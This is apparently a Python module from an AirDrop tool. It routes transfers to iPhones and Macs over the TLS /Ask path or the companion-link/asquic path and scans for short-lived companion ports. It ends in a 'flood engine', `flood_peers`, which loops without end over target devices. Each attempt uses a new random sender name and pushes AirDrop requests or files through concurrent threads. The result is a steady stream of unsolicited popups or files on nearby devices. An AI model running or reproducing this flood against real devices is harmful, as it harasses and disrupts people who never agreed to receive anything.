"""AirDrop routing (opendrop TLS vs modern companion-link) and flood engine."""

from __future__ import annotations

import threading
import time
from pathlib import Path
from typing import Any

from config import log
from constants import DEFAULT_ASQUIC_PORT, DEFAULT_TLS_PORT
from discovery import discover_ports, resolve_instance_mdns
from legacy import (
    LegacyTLSAirDrop,
    fresh_sender_id,
    is_modern_ios_ask_response,
    normalize_url,
    prompt_for_accept,
    resolve_ask_file,
)
from modern import ModernAirDrop
from netutil import norm_ipv6, random_sender_name
from peers import PeerPorts, _merge_peer_ports, load_peer_from_discover

_POST_ACCEPT_SNIFF_S = 4.0
_INSTANCE_SNIFF_S = 3.0


def _peer_service_id(peer: str) -> str | None:
    cached = load_peer_from_discover(peer)
    if cached and cached.service_id:
        return cached.service_id
    return None


def _instance_from_ask(ask_plist: dict[str, Any] | None) -> str | None:
    if not ask_plist:
        return None
    for key in ("IDSSessionID", "sid", "SessionID"):
        val = ask_plist.get(key)
        if val:
            return str(val)
    return None


def _refresh_companion_ports(
    peer: str,
    ports: PeerPorts,
    iface: str,
    sniff_s: float,
    *,
    ask_plist: dict[str, Any] | None = None,
) -> PeerPorts:
    """Post-Accept: IDSSessionID mDNS + TCP scan first (companion ports are short-lived)."""
    from fastnet import fast_open_companion_ports, scan_companion_ephemeral

    host_n = norm_ipv6(peer)
    merged = PeerPorts(host=host_n)
    merged.tls = ports.tls or merged.tls
    if ports.asquic and ports.asquic != DEFAULT_ASQUIC_PORT:
        merged.asquic = ports.asquic

    instance = _instance_from_ask(ask_plist)
    if instance:
        log(f"query companion/asquic for IDSSessionID {instance[:8]}...", level="dbg")
        inst_ports = resolve_instance_mdns(host_n, iface, instance, sniff_s=_INSTANCE_SNIFF_S)
        merged = _merge_peer_ports(merged, inst_ports)

    open_ports = fast_open_companion_ports(merged, iface, timeout=0.6)
    if not open_ports:
        ep = scan_companion_ephemeral(peer, iface)
        if ep:
            merged.clink = ep[0]
            for p in ep:
                merged.note_tcp_port(p)
            open_ports = ep

    if not open_ports or merged.asquic == DEFAULT_ASQUIC_PORT:
        live = discover_ports(peer, iface, sniff_s=sniff_s, force_rescan=True, rescan=False)
        merged = _merge_peer_ports(merged, live)
        merged.tls = ports.tls or merged.tls
        if not open_ports:
            open_ports = fast_open_companion_ports(merged, iface, timeout=0.6)
            if not open_ports:
                ep = scan_companion_ephemeral(peer, iface)
                if ep:
                    merged.clink = ep[0]
                    for p in ep:
                        merged.note_tcp_port(p)
                    open_ports = ep

    if open_ports:
        merged.clink = open_ports[0]

    log(
        f"ports: companion={merged.companion_candidates()} open={open_ports or 'none'} "
        f"asquic={merged.asquic} tls={merged.tls}",
        level="dbg",
    )
    return merged


def _try_modern_upload(
    peer: str,
    ports: PeerPorts,
    iface: str,
    sender: str,
    modern: ModernAirDrop,
    file_path: Path,
) -> bool:
    from fastnet import fast_open_companion_ports, scan_companion_ephemeral

    open_ports = fast_open_companion_ports(ports, iface, timeout=1.0)
    if not open_ports:
        ep = scan_companion_ephemeral(peer, iface)
        if ep:
            ports.clink = ep[0]
            for p in ep:
                ports.note_tcp_port(p)
            open_ports = ep
    if not open_ports:
        return False

    ports.clink = open_ports[0]
    log(f"path=modern companion {open_ports} (asquic file transfer)")
    try:
        if not modern.companion_session(ports, sender):
            return False
        ports = _refresh_companion_ports(peer, ports, iface, 3.0)
        return modern.upload(ports, sender, file_path, after_handshake=True)
    finally:
        modern.close_session()


def _ios_file_upload(
    peer: str,
    ports: PeerPorts,
    iface: str,
    sender: str,
    modern: ModernAirDrop,
    file_path: Path,
    *,
    service_id: str | None,
    accept_wait: float,
    apple_id: str | None,
    phone: str | None,
    record_data: bytes | None,
) -> bool:
    """
    iPhone/iPad file send: TLS /Ask (popup) -> Accept -> companion-link + asquic.
    Never attempts :8770 /Upload on modern iOS (pcap-confirmed).
    """
    tls_port = ports.tls or DEFAULT_TLS_PORT
    log(f"path=iOS: TLS :{tls_port} /Ask (popup) -> companion-link + asquic")

    leg = LegacyTLSAirDrop(
        iface,
        computer_name=sender,
        apple_id=apple_id,
        phone=phone,
        record_data=record_data,
    )
    ask_ok, ask_plist = leg.ask_session(
        peer,
        tls_port,
        sender,
        file_path=file_path,
        service_id=service_id,
    )
    if not ask_ok:
        return False

    if not is_modern_ios_ask_response(ask_plist):
        log("receiver plist not modern iOS — falling back to TLS /Upload", level="warn")
        return leg.send_session(
            peer,
            tls_port,
            sender,
            file_path=file_path,
            service_id=service_id,
            discover=False,
            do_upload=True,
            accept_wait=accept_wait,
        )

    log("modern iOS — skipping :8770 /Upload (uses encrypted asquic)")
    log("companion-link port opens after Accept — tap Accept on receiver now")
    prompt_for_accept(accept_wait)
    log("resniff companion/asquic after Accept ...")
    ports = _refresh_companion_ports(
        peer, ports, iface, _POST_ACCEPT_SNIFF_S, ask_plist=ask_plist
    )

    if _try_modern_upload(peer, ports, iface, sender, modern, file_path):
        return True

    log(
        "modern upload failed — ensure AirDrop share sheet is open, tap Accept promptly, "
        "then re-run send (capture awdl0 if it still fails)",
        level="err",
    )
    return False


def execute_airdrop_action(
    peer: str,
    ports: PeerPorts,
    iface: str,
    sender: str,
    modern: ModernAirDrop,
    *,
    file_path: Path | None = None,
    url: str | None = None,
    do_upload: bool = False,
    prefer_tls: bool = False,
    accept_wait: float = 0.0,
    direct: bool = False,
    apple_id: str | None = None,
    phone: str | None = None,
    record_data: bytes | None = None,
) -> bool:
    """
    Routing:
      file + iOS (default) — TLS /Ask popup -> Accept -> companion-link + asquic
      file + --legacy-tls   — TLS /Ask -> /Upload (gzip-cpio)
      url                   — TLS /Ask with Items=[url] only
      ask-only              — TLS or modern companion
    """
    is_url = bool(url)
    if is_url:
        url = normalize_url(url)
        do_upload = False
    elif file_path:
        file_path = resolve_ask_file(file_path)
    else:
        file_path = resolve_ask_file(Path("/tmp/poke.txt"))

    service_id = fresh_sender_id() if direct else _peer_service_id(peer)

    if do_upload and not prefer_tls and not is_url:
        return _ios_file_upload(
            peer,
            ports,
            iface,
            sender,
            modern,
            file_path,
            service_id=service_id,
            accept_wait=accept_wait,
            apple_id=apple_id,
            phone=phone,
            record_data=record_data,
        )

    if prefer_tls or ports.tls or direct or is_url:
        tls_port = ports.tls or DEFAULT_TLS_PORT
        log(
            f"path=TLS opendrop :{tls_port} (/Ask"
            + (" URL" if is_url else (" -> /Upload" if do_upload else ""))
            + (", no /Discover" if direct else "")
            + ")",
        )
        leg = LegacyTLSAirDrop(
            iface,
            computer_name=sender,
            apple_id=apple_id,
            phone=phone,
            record_data=record_data,
        )
        ok = leg.send_session(
            peer,
            tls_port,
            sender,
            file_path=file_path,
            url=url,
            service_id=service_id,
            discover=not direct,
            do_upload=do_upload,
            accept_wait=accept_wait,
        )
        if ok or prefer_tls or is_url:
            return ok

    from fastnet import fast_open_companion_ports

    companion_open = fast_open_companion_ports(ports, iface)
    if companion_open:
        ports.clink = companion_open[0]
        log(f"path=modern companion {companion_open}", level="dbg")
        try:
            return modern.companion_session(ports, sender)
        finally:
            modern.close_session()

    log("no route — TLS and companion both failed", level="err")
    return False


def flood_peers(
    peers: list[str],
    iface: str,
    *,
    file_path: Path | None,
    workers: int,
    delay: float,
    timeout: float,
    legacy_tls: bool,
    ask_only: bool,
) -> None:
    sem = threading.Semaphore(workers)
    modern = ModernAirDrop(iface, timeout=timeout)
    stop = threading.Event()
    attempt = 0

    def one(peer: str) -> None:
        if not sem.acquire(blocking=False):
            return
        try:
            sender = random_sender_name()
            ports = discover_ports(peer, iface)
            log(f"-> {peer} as {sender!r} companion={ports.companion_candidates()} tls={ports.tls}")
            fpath = file_path or Path("/tmp/poke.txt")
            execute_airdrop_action(
                peer,
                ports,
                iface,
                sender,
                modern,
                file_path=fpath,
                do_upload=bool(file_path and not ask_only),
                prefer_tls=legacy_tls,
            )
        except Exception as exc:
            log(f"{peer}: {exc}", level="dbg")
        finally:
            sem.release()

    log(f"FLOOD peers={len(peers)} workers={workers} delay={delay}s legacy_tls={legacy_tls}")
    try:
        while not stop.is_set():
            for peer in peers:
                attempt += 1
                threading.Thread(target=one, args=(peer,), daemon=True).start()
                time.sleep(delay)
    except KeyboardInterrupt:
        log(f"stopped after ~{attempt} attempts")
